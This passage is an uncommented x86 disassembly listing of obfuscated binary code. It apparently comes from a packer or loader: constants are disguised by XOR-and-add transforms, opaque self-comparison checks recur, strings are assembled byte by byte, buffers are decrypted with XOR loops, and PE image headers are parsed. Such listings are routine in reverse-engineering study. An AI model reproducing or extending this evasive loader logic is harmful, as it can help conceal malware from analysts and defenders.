  420a90:	imul   eax,ecx
  420a93:	mov    ecx,DWORD PTR [ebp-0x24]
  420a96:	xor    ecx,ebx
  420a98:	add    ecx,esi
  420a9a:	or     eax,ecx
  420a9c:	mov    ecx,DWORD PTR [ebp-0x30]
  420a9f:	xor    ecx,ebx
  420aa1:	add    eax,ecx
  420aa3:	mov    ecx,DWORD PTR [ebp-0x30]
  420aa6:	xor    ecx,ebx
  420aa8:	add    eax,ecx
  420aaa:	mov    ecx,DWORD PTR [ebp-0xc]
  420aad:	lea    eax,[eax+ecx*1+0x64e5f4]
  420ab4:	jmp    0x420ac5
  420ab6:	mov    eax,DWORD PTR [ebp-0x30]
  420ab9:	mov    ecx,DWORD PTR [ebp-0xc]
  420abc:	xor    eax,ebx
  420abe:	lea    eax,[eax+ecx*1+0x3272fa]
  420ac5:	mov    DWORD PTR [ebp-0xc],eax
  420ac8:	mov    eax,DWORD PTR [ebp-0x30]
  420acb:	xor    eax,ebx
  420acd:	mov    ecx,0xffcd8d06
  420ad2:	sub    ecx,eax
  420ad4:	add    ecx,DWORD PTR [ebp-0x28]
  420ad7:	mov    eax,DWORD PTR [ebp-0x30]
  420ada:	mov    edx,DWORD PTR [ebp-0xc]
  420add:	xor    eax,ebx
  420adf:	add    eax,esi
  420ae1:	imul   eax,edx
  420ae4:	cmp    eax,ecx
  420ae6:	jbe    0x4208f8
  420aec:	mov    eax,DWORD PTR [ebp-0x10]
  420aef:	mov    ecx,DWORD PTR [ebp-0x3c]
  420af2:	mov    eax,DWORD PTR [ebp+0x8]
  420af5:	mov    edx,DWORD PTR [ebp-0x54]
  420af8:	mov    eax,DWORD PTR [eax+0x1e0]
  420afe:	xor    edx,ebx
  420b00:	add    edx,esi
  420b02:	push   edx
  420b03:	mov    edx,DWORD PTR [ebp-0x40]
  420b06:	xor    edx,ebx
  420b08:	add    edx,esi
  420b0a:	push   edx
  420b0b:	push   ecx
  420b0c:	mov    DWORD PTR [ebp-0x38],ecx
  420b0f:	mov    ecx,DWORD PTR [ebp-0x10]
  420b12:	xor    ecx,ebx
  420b14:	add    ecx,esi
  420b16:	push   ecx
  420b17:	call   DWORD PTR [eax+0x14]
  420b1a:	mov    edi,eax
  420b1c:	mov    eax,DWORD PTR [ebp-0x10]
  420b1f:	xor    eax,ebx
  420b21:	add    eax,esi
  420b23:	cmp    eax,edi
  420b25:	je     0x420b80
  420b27:	mov    eax,DWORD PTR [ebp-0x10]
  420b2a:	jmp    0x420b4d
  420b2c:	mov    ecx,DWORD PTR [ebp-0x2c]
  420b2f:	xor    eax,ebx
  420b31:	mov    cl,BYTE PTR [ecx+eax*1+0x3272fa]
  420b38:	mov    BYTE PTR [eax+edi*1+0x3272fa],cl
  420b3f:	mov    ecx,DWORD PTR [ebp-0x18]
  420b42:	xor    ecx,ebx
  420b44:	lea    eax,[ecx+eax*1+0x3272fa]
  420b4b:	xor    eax,ebx
  420b4d:	mov    ecx,DWORD PTR [ebp-0x3c]
  420b50:	sub    ecx,esi
  420b52:	xor    ecx,ebx
  420b54:	cmp    eax,ecx
  420b56:	jne    0x420b2c
  420b58:	mov    eax,DWORD PTR [ebp+0x8]
  420b5b:	mov    ecx,DWORD PTR [ebp-0x50]
  420b5e:	mov    eax,DWORD PTR [eax+0x1e0]
  420b64:	xor    ecx,ebx
  420b66:	add    ecx,esi
  420b68:	push   ecx
  420b69:	mov    ecx,DWORD PTR [ebp-0x10]
  420b6c:	xor    ecx,ebx
  420b6e:	add    ecx,esi
  420b70:	push   ecx
  420b71:	push   DWORD PTR [ebp-0x2c]
  420b74:	call   DWORD PTR [eax+0x18]
  420b77:	mov    eax,DWORD PTR [ebp-0x38]
  420b7a:	mov    DWORD PTR [ebp-0x2c],edi
  420b7d:	mov    DWORD PTR [ebp-0x3c],eax
  420b80:	mov    eax,DWORD PTR [ebp-0x2c]
  420b83:	mov    DWORD PTR [ebp-0x14],eax
  420b86:	mov    eax,DWORD PTR [ebp-0x18]
  420b89:	mov    ecx,DWORD PTR [ebp-0x10]
  420b8c:	xor    eax,ebx
  420b8e:	add    eax,esi
  420b90:	mov    DWORD PTR [ebp-0x5c],0xbad3cbd3
  420b97:	mov    DWORD PTR [ebp-0x58],0xc4d3bcd3
  420b9e:	jmp    0x420bd1
  420ba0:	mov    edx,DWORD PTR [ebp-0x14]
  420ba3:	mov    edi,ecx
  420ba5:	xor    edi,ebx
  420ba7:	mov    cl,BYTE PTR [ebp+edi*1+0x32729e]
  420bae:	movsx  edx,BYTE PTR [edi+edx*1+0x3272fa]
  420bb6:	xor    cl,0x81
  420bb9:	add    cl,0x6
  420bbc:	movzx  ecx,cl
  420bbf:	cmp    edx,ecx
  420bc1:	jne    0x420bdb
  420bc3:	mov    ecx,DWORD PTR [ebp-0x18]
  420bc6:	xor    ecx,ebx
  420bc8:	lea    ecx,[ecx+edi*1+0x3272fa]
  420bcf:	xor    ecx,ebx
  420bd1:	cmp    ecx,0xf89c85bd
  420bd7:	jne    0x420ba0
  420bd9:	jmp    0x420be2
  420bdb:	mov    eax,DWORD PTR [ebp-0x10]
  420bde:	xor    eax,ebx
  420be0:	add    eax,esi
  420be2:	mov    ecx,DWORD PTR [ebp-0x10]
  420be5:	xor    ecx,ebx
  420be7:	add    ecx,esi
  420be9:	cmp    ecx,eax
  420beb:	je     0x420d61
  420bf1:	mov    eax,DWORD PTR [ebp-0x14]
  420bf4:	mov    eax,DWORD PTR [eax+0x8]
  420bf7:	mov    DWORD PTR [ebp-0xc],0xf89c85b5
  420bfe:	mov    DWORD PTR [ebp-0x40],0xf89cc3c6
  420c05:	mov    DWORD PTR [ebp-0x44],0xf89cb5b5
  420c0c:	mov    DWORD PTR [ebp-0x24],0xf89c85b9
  420c13:	mov    DWORD PTR [ebp-0x20],eax
  420c16:	mov    eax,DWORD PTR [ebp+0x8]
  420c19:	mov    ecx,DWORD PTR [ebp-0x24]
  420c1c:	xor    ecx,ebx
  420c1e:	add    ecx,esi
  420c20:	push   ecx
  420c21:	mov    ecx,DWORD PTR [ebp-0x44]
  420c24:	mov    eax,DWORD PTR [eax+0x1e0]
  420c2a:	xor    ecx,ebx
  420c2c:	add    ecx,esi
  420c2e:	push   ecx
  420c2f:	mov    ecx,DWORD PTR [ebp-0x40]
  420c32:	xor    ecx,ebx
  420c34:	add    ecx,esi
  420c36:	push   ecx
  420c37:	mov    ecx,DWORD PTR [ebp-0xc]
  420c3a:	xor    ecx,ebx
  420c3c:	add    ecx,esi
  420c3e:	push   ecx
  420c3f:	call   DWORD PTR [eax+0x14]
  420c42:	mov    edi,eax
  420c44:	mov    eax,DWORD PTR [ebp+0x8]
  420c47:	mov    ecx,DWORD PTR [ebp-0x24]
  420c4a:	mov    eax,DWORD PTR [eax+0x1e0]
  420c50:	xor    ecx,ebx
  420c52:	add    ecx,esi
  420c54:	push   ecx
  420c55:	mov    ecx,DWORD PTR [ebp-0x44]
  420c58:	xor    ecx,ebx
  420c5a:	add    ecx,esi
  420c5c:	push   ecx
  420c5d:	mov    ecx,DWORD PTR [ebp-0xc]
  420c60:	push   DWORD PTR [ebp-0x20]
  420c63:	xor    ecx,ebx
  420c65:	add    ecx,esi
  420c67:	push   ecx
  420c68:	call   DWORD PTR [eax+0x14]
  420c6b:	mov    ecx,DWORD PTR [ebp-0xc]
  420c6e:	xor    ecx,ebx
  420c70:	add    ecx,esi
  420c72:	mov    DWORD PTR [ebp-0x24],eax
  420c75:	cmp    ecx,edi
  420c77:	je     0x421004
  420c7d:	mov    ecx,DWORD PTR [ebp-0xc]
  420c80:	xor    ecx,ebx
  420c82:	add    ecx,esi
  420c84:	cmp    ecx,eax
  420c86:	je     0x421004
  420c8c:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  420c93:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  420c9a:	mov    ecx,DWORD PTR [ebp-0x40]
  420c9d:	xor    cl,0xb3
  420ca0:	sub    cl,0x6
  420ca3:	mov    BYTE PTR [edi],cl
  420ca5:	mov    ecx,DWORD PTR [ebp-0xc]
  420ca8:	xor    cl,0xb3
  420cab:	sub    cl,0x6
  420cae:	mov    BYTE PTR [edi+0x1],cl
  420cb1:	mov    ecx,DWORD PTR [ebp-0x54]
  420cb4:	xor    cl,0xb3
  420cb7:	sub    cl,0x6
  420cba:	mov    BYTE PTR [edi+0x2],cl
  420cbd:	and    DWORD PTR [ebp-0xc8],0x0
  420cc4:	and    DWORD PTR [ebp-0xdc],0x0
  420ccb:	lea    ecx,[ebp-0xdc]
  420cd1:	push   ecx
  420cd2:	push   DWORD PTR [ebp-0x20]
  420cd5:	push   eax
  420cd6:	lea    eax,[ebp-0xc8]
  420cdc:	push   eax
  420cdd:	mov    eax,DWORD PTR [ebp-0x14]
  420ce0:	push   DWORD PTR [eax+0xc]
  420ce3:	mov    eax,DWORD PTR [ebp-0x2c]
  420ce6:	add    eax,0x10
  420ce9:	push   eax
  420cea:	push   edi
  420ceb:	call   0x41ff8f
  420cf0:	mov    DWORD PTR [ebp-0x40],eax
  420cf3:	mov    eax,DWORD PTR [ebp+0x8]
  420cf6:	mov    ecx,DWORD PTR [ebp-0x50]
  420cf9:	mov    eax,DWORD PTR [eax+0x1e0]
  420cff:	xor    ecx,ebx
  420d01:	add    ecx,esi
  420d03:	push   ecx
  420d04:	mov    ecx,DWORD PTR [ebp-0xc]
  420d07:	xor    ecx,ebx
  420d09:	add    ecx,esi
  420d0b:	push   ecx
  420d0c:	push   edi
  420d0d:	call   DWORD PTR [eax+0x18]
  420d10:	mov    eax,DWORD PTR [ebp-0x40]
  420d13:	add    eax,0xffcd8d06
  420d18:	xor    eax,ebx
  420d1a:	cmp    eax,0xf89c85b5
  420d1f:	mov    eax,DWORD PTR [ebp+0x8]
  420d22:	mov    eax,DWORD PTR [eax+0x1e0]
  420d28:	mov    ecx,DWORD PTR [ebp-0x50]
  420d2b:	jne    0x420d4e
  420d2d:	xor    ecx,ebx
  420d2f:	add    ecx,esi
  420d31:	push   ecx
  420d32:	mov    ecx,DWORD PTR [ebp-0xc]
  420d35:	xor    ecx,ebx
  420d37:	add    ecx,esi
  420d39:	push   ecx
  420d3a:	push   DWORD PTR [ebp-0x2c]
  420d3d:	call   DWORD PTR [eax+0x18]
  420d40:	mov    eax,DWORD PTR [ebp-0x24]
  420d43:	mov    DWORD PTR [ebp-0x2c],eax
  420d46:	mov    eax,DWORD PTR [ebp-0x20]
  420d49:	mov    DWORD PTR [ebp-0x3c],eax
  420d4c:	jmp    0x420d61
  420d4e:	xor    ecx,ebx
  420d50:	add    ecx,esi
  420d52:	push   ecx
  420d53:	mov    ecx,DWORD PTR [ebp-0xc]
  420d56:	xor    ecx,ebx
  420d58:	add    ecx,esi
  420d5a:	push   ecx
  420d5b:	push   DWORD PTR [ebp-0x24]
  420d5e:	call   DWORD PTR [eax+0x18]
  420d61:	mov    eax,DWORD PTR [ebp-0x3c]
  420d64:	mov    DWORD PTR [ebp-0x34],eax
  420d67:	mov    eax,DWORD PTR [ebp-0x2c]
  420d6a:	mov    DWORD PTR [ebp-0x28],0xf89c85b5
  420d71:	mov    DWORD PTR [ebp-0x40],eax
  420d74:	mov    edi,0xf89c85b4
  420d79:	mov    DWORD PTR [ebp-0x30],edi
  420d7c:	mov    eax,DWORD PTR [ebp-0x28]
  420d7f:	xor    eax,ebx
  420d81:	add    eax,esi
  420d83:	mov    DWORD PTR [ebp-0xc],eax
  420d86:	mov    eax,DWORD PTR [ebp-0x28]
  420d89:	xor    eax,ebx
  420d8b:	add    eax,esi
  420d8d:	mov    DWORD PTR [ebp-0x14],eax
  420d90:	mov    DWORD PTR [ebp-0x44],0xf89c8595
  420d97:	mov    DWORD PTR [ebp-0x24],0xf89c85be
  420d9e:	mov    eax,DWORD PTR [ebp-0x28]
  420da1:	mov    ecx,DWORD PTR [ebp-0x34]
  420da4:	xor    eax,ebx
  420da6:	add    eax,esi
  420da8:	cmp    ecx,eax
  420daa:	je     0x420fa0
  420db0:	jmp    0x420f7c
  420db5:	mov    ecx,DWORD PTR [ebp-0xc]
  420db8:	mov    eax,DWORD PTR [ebp-0x34]
  420dbb:	sub    eax,ecx
  420dbd:	mov    ecx,DWORD PTR [ebp-0x44]
  420dc0:	xor    ecx,ebx
  420dc2:	add    ecx,esi
  420dc4:	xor    edx,edx
  420dc6:	div    ecx
  420dc8:	mov    DWORD PTR [ebp-0x14],eax
  420dcb:	mov    eax,DWORD PTR [ebp-0x24]
  420dce:	mov    ecx,DWORD PTR [ebp-0x14]
  420dd1:	xor    eax,ebx
  420dd3:	add    eax,esi
  420dd5:	cmp    ecx,eax
  420dd7:	jbe    0x420de3
  420dd9:	mov    eax,DWORD PTR [ebp-0x24]
  420ddc:	xor    eax,ebx
  420dde:	add    eax,esi
  420de0:	mov    DWORD PTR [ebp-0x14],eax
  420de3:	mov    eax,DWORD PTR [ebp-0x44]
  420de6:	mov    ecx,DWORD PTR [ebp-0x14]
  420de9:	xor    eax,ebx
  420deb:	add    eax,esi
  420ded:	imul   eax,ecx
  420df0:	mov    DWORD PTR [ebp-0x14],eax
  420df3:	mov    eax,DWORD PTR [ebp-0x28]
  420df6:	mov    ecx,DWORD PTR [ebp-0x14]
  420df9:	xor    eax,ebx
  420dfb:	add    eax,esi
  420dfd:	cmp    ecx,eax
  420dff:	je     0x420f6a
  420e05:	mov    eax,DWORD PTR [ebp-0x14]
  420e08:	mov    DWORD PTR [ebp-0x20],eax
  420e0b:	mov    eax,DWORD PTR [ebp-0xc]
  420e0e:	add    eax,DWORD PTR [ebp-0x40]
  420e11:	mov    DWORD PTR [ebp-0x4c],0xf89c85b5
  420e18:	mov    DWORD PTR [ebp-0x14],edi
  420e1b:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  420e22:	mov    DWORD PTR [ebp-0x1c],eax
  420e25:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  420e2c:	mov    DWORD PTR [ebp-0x8],edi
  420e2f:	mov    eax,DWORD PTR [ebp-0x4c]
  420e32:	xor    eax,ebx
  420e34:	add    eax,esi
  420e36:	jmp    0x420f29
  420e3b:	mov    DWORD PTR [ebp-0xe4],0xf89c85a2
  420e45:	mov    DWORD PTR [ebp-0xd0],0xf89c85af
  420e4f:	mov    eax,DWORD PTR [ebp-0x8]
  420e52:	mov    ecx,DWORD PTR [ebp-0x18]
  420e55:	xor    eax,ebx
  420e57:	add    eax,esi
  420e59:	imul   eax,ecx
  420e5c:	mov    ecx,DWORD PTR [ebp-0x1c]
  420e5f:	mov    al,BYTE PTR [eax+ecx*1]
  420e62:	mov    BYTE PTR [ebp-0x1],al
  420e65:	mov    eax,DWORD PTR [ebp-0x8]
  420e68:	mov    ecx,DWORD PTR [ebp-0x18]
  420e6b:	xor    eax,ebx
  420e6d:	add    eax,esi
  420e6f:	imul   eax,ecx
  420e72:	mov    ecx,DWORD PTR [ebp-0x54]
  420e75:	xor    ecx,ebx
  420e77:	add    eax,ecx
  420e79:	mov    ecx,DWORD PTR [ebp-0x1c]
  420e7c:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  420e84:	mov    ecx,DWORD PTR [ebp-0xe4]
  420e8a:	xor    ecx,ebx
  420e8c:	lea    eax,[ecx+eax*1+0x3272fa]
  420e93:	movzx  ecx,BYTE PTR [ebp-0x1]
  420e97:	xor    ecx,eax
  420e99:	mov    BYTE PTR [ebp-0x1],cl
  420e9c:	mov    al,BYTE PTR [ebp-0x1]
  420e9f:	mov    ecx,DWORD PTR [ebp-0x8]
  420ea2:	mov    edx,DWORD PTR [ebp-0x18]
  420ea5:	xor    ecx,ebx
  420ea7:	add    ecx,esi
  420ea9:	imul   ecx,edx
  420eac:	mov    edx,DWORD PTR [ebp-0x1c]
  420eaf:	mov    BYTE PTR [ecx+edx*1],al
  420eb2:	mov    eax,DWORD PTR [ebp-0x8]
  420eb5:	mov    ecx,DWORD PTR [ebp-0x18]
  420eb8:	xor    eax,ebx
  420eba:	add    eax,esi
  420ebc:	imul   eax,ecx
  420ebf:	mov    ecx,DWORD PTR [ebp-0x1c]
  420ec2:	mov    al,BYTE PTR [eax+ecx*1]
  420ec5:	mov    BYTE PTR [ebp-0x1],al
  420ec8:	mov    eax,DWORD PTR [ebp-0x8]
  420ecb:	mov    ecx,DWORD PTR [ebp-0x18]
  420ece:	xor    eax,ebx
  420ed0:	add    eax,esi
  420ed2:	imul   eax,ecx
  420ed5:	mov    ecx,DWORD PTR [ebp-0x14]
  420ed8:	xor    ecx,ebx
  420eda:	add    eax,ecx
  420edc:	mov    ecx,DWORD PTR [ebp-0x1c]
  420edf:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  420ee7:	mov    ecx,DWORD PTR [ebp-0xd0]
  420eed:	xor    ecx,ebx
  420eef:	lea    eax,[ecx+eax*1+0x3272fa]
  420ef6:	movzx  ecx,BYTE PTR [ebp-0x1]
  420efa:	xor    ecx,eax
  420efc:	mov    BYTE PTR [ebp-0x1],cl
  420eff:	mov    al,BYTE PTR [ebp-0x1]
  420f02:	mov    ecx,DWORD PTR [ebp-0x8]
  420f05:	mov    edx,DWORD PTR [ebp-0x18]
  420f08:	xor    ecx,ebx
  420f0a:	add    ecx,esi
  420f0c:	imul   ecx,edx
  420f0f:	mov    edx,DWORD PTR [ebp-0x1c]
  420f12:	mov    BYTE PTR [ecx+edx*1],al
  420f15:	mov    eax,DWORD PTR [ebp-0x38]
  420f18:	mov    ecx,DWORD PTR [ebp-0x14]
  420f1b:	xor    eax,ebx
  420f1d:	xor    ecx,ebx
  420f1f:	add    eax,esi
  420f21:	add    ecx,esi
  420f23:	imul   eax,ecx
  420f26:	add    eax,DWORD PTR [ebp-0x18]
  420f29:	mov    DWORD PTR [ebp-0x18],eax
  420f2c:	mov    eax,DWORD PTR [ebp-0x18]
  420f2f:	mov    ecx,DWORD PTR [ebp-0x20]
  420f32:	cmp    ecx,eax
  420f34:	jb     0x420e3b
  420f3a:	mov    eax,DWORD PTR [ebp-0x14]
  420f3d:	mov    ecx,DWORD PTR [ebp-0x20]
  420f40:	xor    eax,ebx
  420f42:	add    eax,esi
  420f44:	imul   eax,ecx
  420f47:	mov    ecx,DWORD PTR [ebp-0x4c]
  420f4a:	xor    ecx,ebx
  420f4c:	add    ecx,esi
  420f4e:	or     eax,ecx
  420f50:	mov    ecx,DWORD PTR [ebp-0x30]
  420f53:	xor    ecx,ebx
  420f55:	add    eax,ecx
  420f57:	mov    ecx,DWORD PTR [ebp-0x30]
  420f5a:	xor    ecx,ebx
  420f5c:	add    eax,ecx
  420f5e:	mov    ecx,DWORD PTR [ebp-0xc]
  420f61:	lea    eax,[eax+ecx*1+0x64e5f4]
  420f68:	jmp    0x420f79
  420f6a:	mov    eax,DWORD PTR [ebp-0x30]
  420f6d:	mov    ecx,DWORD PTR [ebp-0xc]
  420f70:	xor    eax,ebx
  420f72:	lea    eax,[eax+ecx*1+0x3272fa]
  420f79:	mov    DWORD PTR [ebp-0xc],eax
  420f7c:	mov    eax,DWORD PTR [ebp-0x30]
  420f7f:	xor    eax,ebx
  420f81:	mov    ecx,0xffcd8d06
  420f86:	sub    ecx,eax
  420f88:	add    ecx,DWORD PTR [ebp-0x34]
  420f8b:	mov    eax,DWORD PTR [ebp-0x30]
  420f8e:	mov    edx,DWORD PTR [ebp-0xc]
  420f91:	xor    eax,ebx
  420f93:	add    eax,esi
  420f95:	imul   eax,edx
  420f98:	cmp    eax,ecx
  420f9a:	jbe    0x420db5
  420fa0:	push   DWORD PTR [ebp+0x8]
  420fa3:	mov    eax,DWORD PTR [ebp+0x8]
  420fa6:	push   DWORD PTR [eax+0x1cc]
  420fac:	lea    eax,[ebp-0xd8]
  420fb2:	push   eax
  420fb3:	mov    eax,DWORD PTR [ebp+0x8]
  420fb6:	mov    eax,DWORD PTR [eax+0x1c4]
  420fbc:	push   DWORD PTR [eax]
  420fbe:	mov    eax,DWORD PTR [ebp+0x8]
  420fc1:	mov    eax,DWORD PTR [eax+0x1c0]
  420fc7:	push   DWORD PTR [eax]
  420fc9:	push   DWORD PTR [ebp-0x3c]
  420fcc:	push   DWORD PTR [ebp-0x2c]
  420fcf:	call   0x421a66
  420fd4:	mov    DWORD PTR [ebp-0x40],eax
  420fd7:	mov    eax,DWORD PTR [ebp-0x10]
  420fda:	mov    ecx,DWORD PTR [ebp-0x2c]
  420fdd:	xor    eax,ebx
  420fdf:	add    eax,esi
  420fe1:	cmp    eax,ecx
  420fe3:	je     0x421004
  420fe5:	mov    eax,DWORD PTR [ebp+0x8]
  420fe8:	mov    ecx,DWORD PTR [ebp-0x50]
  420feb:	mov    eax,DWORD PTR [eax+0x1e0]
  420ff1:	xor    ecx,ebx
  420ff3:	add    ecx,esi
  420ff5:	push   ecx
  420ff6:	mov    ecx,DWORD PTR [ebp-0x10]
  420ff9:	xor    ecx,ebx
  420ffb:	add    ecx,esi
  420ffd:	push   ecx
  420ffe:	push   DWORD PTR [ebp-0x2c]
  421001:	call   DWORD PTR [eax+0x18]
  421004:	pop    edi
  421005:	pop    esi
  421006:	pop    ebx
  421007:	leave  
  421008:	ret    0x4
  42100b:	push   ebp
  42100c:	mov    ebp,esp
  42100e:	push   ecx
  42100f:	push   ecx
  421010:	lea    eax,[ebp-0x8]
  421013:	mov    DWORD PTR [ebp-0x4],eax
  421016:	push   esi
  421017:	mov    esi,DWORD PTR [ebp-0x4]
  42101a:	mov    eax,0xf881bacf
  42101f:	mov    DWORD PTR [esi],eax
  421021:	mov    esi,DWORD PTR [ebp-0x8]
  421024:	cmp    esi,eax
  421026:	pop    esi
  421027:	jne    0x421031
  421029:	mov    BYTE PTR [ecx+0xa],0x7b
  42102d:	mov    BYTE PTR [edx+0x8],0xcc
  421031:	mov    BYTE PTR [edx+0xa],0x7b
  421035:	mov    BYTE PTR [ecx+0x2],0xe9
  421039:	leave  
  42103a:	ret    
  42103b:	push   ebp
  42103c:	mov    ebp,esp
  42103e:	push   ecx
  42103f:	push   ecx
  421040:	lea    eax,[ebp-0x8]
  421043:	mov    DWORD PTR [ebp-0x4],eax
  421046:	mov    edx,DWORD PTR [ebp-0x4]
  421049:	mov    eax,0xf88b0bd3
  42104e:	mov    DWORD PTR [edx],eax
  421050:	mov    edx,DWORD PTR [ebp-0x8]
  421053:	cmp    edx,eax
  421055:	jne    0x421066
  421057:	mov    eax,DWORD PTR [ebp+0x8]
  42105a:	mov    BYTE PTR [ecx+0x9],0xef
  42105e:	mov    BYTE PTR [eax+0x7],0xa4
  421062:	mov    BYTE PTR [ecx+0x6],0xec
  421066:	mov    BYTE PTR [ecx+0x3],0xdf
  42106a:	leave  
  42106b:	ret    0x4
  42106e:	push   ebp
  42106f:	mov    ebp,esp
  421071:	push   ecx
  421072:	push   ecx
  421073:	lea    eax,[ebp-0x8]
  421076:	mov    DWORD PTR [ebp-0x4],eax
  421079:	mov    edx,DWORD PTR [ebp-0x4]
  42107c:	mov    eax,0x7e0dacf
  421081:	mov    DWORD PTR [edx],eax
  421083:	mov    edx,DWORD PTR [ebp-0x8]
  421086:	cmp    edx,eax
  421088:	jne    0x42108e
  42108a:	mov    BYTE PTR [ecx+0x7],0xa4
  42108e:	mov    eax,DWORD PTR [ebp+0x8]
  421091:	mov    BYTE PTR [ecx+0x1],0xe2
  421095:	mov    BYTE PTR [eax+0x9],0xcf
  421099:	leave  
  42109a:	ret    0x4
  42109d:	push   ebp
  42109e:	mov    ebp,esp
  4210a0:	push   ecx
  4210a1:	push   ecx
  4210a2:	lea    eax,[ebp-0x8]
  4210a5:	mov    DWORD PTR [ebp-0x4],eax
  4210a8:	push   esi
  4210a9:	mov    esi,DWORD PTR [ebp-0x4]
  4210ac:	mov    eax,0x7060e3e
  4210b1:	mov    DWORD PTR [esi],eax
  4210b3:	mov    esi,DWORD PTR [ebp-0x8]
  4210b6:	cmp    esi,eax
  4210b8:	pop    esi
  4210b9:	jne    0x4210c5
  4210bb:	mov    BYTE PTR [edx+0x4],0xe8
  4210bf:	mov    WORD PTR [ecx+0x3],0xe8df
  4210c5:	mov    BYTE PTR [edx],0xbc
  4210c8:	leave  
  4210c9:	ret    
  4210ca:	push   ebp
  4210cb:	mov    ebp,esp
  4210cd:	push   ecx
  4210ce:	push   ecx
  4210cf:	lea    eax,[ebp-0x8]
  4210d2:	mov    DWORD PTR [ebp-0x4],eax
  4210d5:	mov    edx,DWORD PTR [ebp-0x4]
  4210d8:	mov    eax,0xf8870b3f
  4210dd:	mov    DWORD PTR [edx],eax
  4210df:	mov    edx,DWORD PTR [ebp-0x8]
  4210e2:	cmp    edx,eax
  4210e4:	jne    0x4210f1
  4210e6:	mov    eax,DWORD PTR [ebp+0x8]
  4210e9:	mov    BYTE PTR [ecx+0x8],0xec
  4210ed:	mov    BYTE PTR [eax+0x1],0xe2
  4210f1:	mov    BYTE PTR [ecx+0x5],0xf0
  4210f5:	leave  
  4210f6:	ret    0x4
  4210f9:	push   esi
  4210fa:	mov    ecx,edi
  4210fc:	call   0x4210ca
  421101:	mov    edx,edi
  421103:	mov    ecx,esi
  421105:	mov    BYTE PTR [esi],0xdc
  421108:	call   0x42109d
  42110d:	push   esi
  42110e:	mov    ecx,edi
  421110:	mov    BYTE PTR [esi+0x5],0xf0
  421114:	call   0x42106e
  421119:	push   esi
  42111a:	mov    BYTE PTR [esi+0x6],0xec
  42111e:	call   0x42103b
  421123:	mov    BYTE PTR [esi+0x2],0xe9
  421127:	mov    edx,esi
  421129:	jmp    0x42100b
  42112e:	push   ebp
  42112f:	mov    ebp,esp
  421131:	push   ecx
  421132:	mov    ecx,DWORD PTR [edx+0x194]
  421138:	push   esi
  421139:	mov    esi,DWORD PTR [ebp+0x8]
  42113c:	mov    esi,DWORD PTR [esi]
  42113e:	mov    DWORD PTR [ecx],esi
  421140:	mov    ecx,DWORD PTR [edx+0x194]
  421146:	mov    ecx,DWORD PTR [ecx]
  421148:	mov    esi,DWORD PTR [edx+0x190]
  42114e:	mov    DWORD PTR [esi],ecx
  421150:	mov    eax,DWORD PTR [edx+0x194]
  421156:	mov    ecx,DWORD PTR [eax]
  421158:	mov    ecx,DWORD PTR [ecx+0x3c]
  42115b:	add    ecx,DWORD PTR [eax]
  42115d:	mov    DWORD PTR [ebp-0x4],0xf89ca5b5
  421164:	mov    eax,DWORD PTR [ebp-0x4]
  421167:	movzx  ecx,WORD PTR [ecx+0x16]
  42116b:	xor    eax,0x75108b3
  421170:	add    eax,0x3272fa
  421175:	pop    esi
  421176:	test   ecx,eax
  421178:	je     0x421186
  42117a:	mov    eax,DWORD PTR [edx+0x1c8]
  421180:	mov    DWORD PTR [eax],0xf89c85b4
  421186:	leave  
  421187:	ret    0x4
  42118a:	push   ebp
  42118b:	mov    ebp,esp
  42118d:	sub    esp,0x70
  421190:	and    DWORD PTR [ebp-0x20],0x0
  421194:	mov    DWORD PTR [ebp-0x18],0xf89cb5b5
  42119b:	mov    DWORD PTR [ebp-0x1c],0xf89c85f5
  4211a2:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  4211a9:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  4211b0:	mov    DWORD PTR [ebp-0x2c],0xf89f05b5
  4211b7:	mov    eax,DWORD PTR [ebp+0x20]
  4211ba:	mov    eax,DWORD PTR [eax+0x194]
  4211c0:	mov    DWORD PTR [ebp-0xc],eax
  4211c3:	mov    eax,DWORD PTR [ebp+0x20]
  4211c6:	push   ebx
  4211c7:	push   esi
  4211c8:	mov    esi,DWORD PTR [eax+0x190]
  4211ce:	mov    eax,DWORD PTR [ebp+0x20]
  4211d1:	mov    eax,DWORD PTR [eax+0x18c]
  4211d7:	mov    DWORD PTR [ebp-0x8],eax
  4211da:	mov    eax,DWORD PTR [eax]
  4211dc:	push   edi
  4211dd:	mov    DWORD PTR [ebp-0x4],esi
  4211e0:	test   eax,eax
  4211e2:	jne    0x4211ef
  4211e4:	push   DWORD PTR [ebp+0x1c]
  4211e7:	mov    edx,DWORD PTR [ebp+0x20]
  4211ea:	call   0x42112e
  4211ef:	mov    eax,DWORD PTR [esi]
  4211f1:	mov    ebx,DWORD PTR [esi]
  4211f3:	add    ebx,DWORD PTR [eax+0x3c]
  4211f6:	mov    eax,DWORD PTR [ebp+0xc]
  4211f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4211fc:	mov    ecx,DWORD PTR [ecx]
  4211fe:	mov    esi,0x75108b3
  421203:	xor    eax,esi
  421205:	mov    edi,0x3272fa
  42120a:	add    eax,edi
  42120c:	cmp    eax,ecx
  42120e:	jne    0x421446
  421214:	mov    eax,DWORD PTR [ebp-0xc]
  421217:	mov    eax,DWORD PTR [eax]
  421219:	mov    DWORD PTR [ebp-0x10],eax
  42121c:	mov    eax,DWORD PTR [ebx+0x50]
  42121f:	mov    DWORD PTR [ebp-0x68],eax
  421222:	mov    eax,DWORD PTR [ebp-0x18]
  421225:	xor    eax,esi
  421227:	add    eax,edi
  421229:	mov    DWORD PTR [ebp-0x64],eax
  42122c:	mov    eax,DWORD PTR [ebp-0x14]
  42122f:	and    DWORD PTR [ebp-0x6c],0x0
  421233:	xor    eax,esi
  421235:	add    eax,edi
  421237:	mov    DWORD PTR [ebp-0x60],eax
  42123a:	lea    eax,[ebp-0x70]
  42123d:	push   eax
  42123e:	mov    eax,DWORD PTR [ebp+0x8]
  421241:	xor    eax,esi
  421243:	add    eax,edi
  421245:	push   eax
  421246:	mov    eax,DWORD PTR [ebp+0x20]
  421249:	add    eax,0xaa
  42124e:	push   eax
  42124f:	mov    eax,DWORD PTR [ebp+0x20]
  421252:	mov    eax,DWORD PTR [eax+0x198]
  421258:	mov    DWORD PTR [ebp-0x70],0x4
  42125f:	push   DWORD PTR [eax]
